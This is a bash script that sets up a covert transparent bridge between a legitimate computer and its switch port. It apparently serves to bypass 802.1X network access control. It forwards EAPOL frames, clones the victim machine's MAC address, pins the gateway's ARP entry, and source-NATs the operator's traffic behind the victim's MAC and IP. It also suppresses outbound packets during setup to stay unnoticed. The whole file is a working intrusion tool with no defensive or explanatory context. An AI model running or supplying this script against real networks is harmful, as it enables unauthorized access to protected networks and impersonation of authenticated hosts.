#!/bin/bash

#pre-populated variables
SWMAC=f0:de:f1:83:d9:f3
COMPMAC=e8:9a:8f:fc:9b:3a
GWMAC=00:00:0c:07:ac:01

COMIP=172.19.1.57
GWNET=172.19.1.0/24
DEFGW=172.19.1.1
BRIP=169.254.66.66

BRINT=br0
SWINT=eth0
COMPINT=eth1

RANGE=61000-62000

ifconfig $BRINT down
brctl delbr $BRINT

#build the bridge
brctl addbr $BRINT
brctl addif $BRINT $COMPINT
brctl addif $BRINT $SWINT

echo 8 > /sys/class/net/$BRINT/bridge/group_fwd_mask

#bring up both sides of the bridge
ifconfig $COMPINT 0.0.0.0 up promisc
ifconfig $SWINT 0.0.0.0 up promisc

#start dark
arptables -A OUTPUT -j DROP
iptables -A OUTPUT -j DROP

#swap the mac address to the switch side mac, so we always know which mac the bridge is
#macchanger -m $SWMAC $BRINT
macchanger -m $COMPMAC $BRINT
macchanger -m $COMPMAC $SWINT

# bring up the bridge with the non-routable IP
ifconfig $BRINT $BRIP up promisc

# force the link to reset
mii-tool -r $COMPINT
mii-tool -r $SWINT

#add the network info
#add the default route
route add -net $GWNET dev $BRINT
route add default gw $DEFGW

#add the arp entry
arp -s -i $BRINT $DEFGW $GWMAC

# use ebtables to source NAT the $COMPMAC for traffic leaving the device
# from the bridge mac address
ebtables -t nat -A POSTROUTING -s $SWMAC -o $SWINT -j snat --to-src $COMPMAC
ebtables -t nat -A POSTROUTING -s $SWMAC -o $BRINT -j snat --to-src $COMPMAC

# set up the source nat rules for tcp/udp/icmp
iptables -t nat -A POSTROUTING -o $BRINT -s $BRIP -p tcp -j SNAT --to $COMIP:$RANGE
iptables -t nat -A POSTROUTING -o $BRINT -s $BRIP -p udp -j SNAT --to $COMIP:$RANGE
iptables -t nat -A POSTROUTING -o $BRINT -s $BRIP -p icmp -j SNAT --to $COMIP

#return from radio silence
arptables -D OUTPUT -j DROP
iptables -D OUTPUT -j DROP

sleep 5
macchanger -r $SWINT
sleep 2
macchanger -m $COMPMAC $SWINT
sleep 15
macchanger -r $SWINT
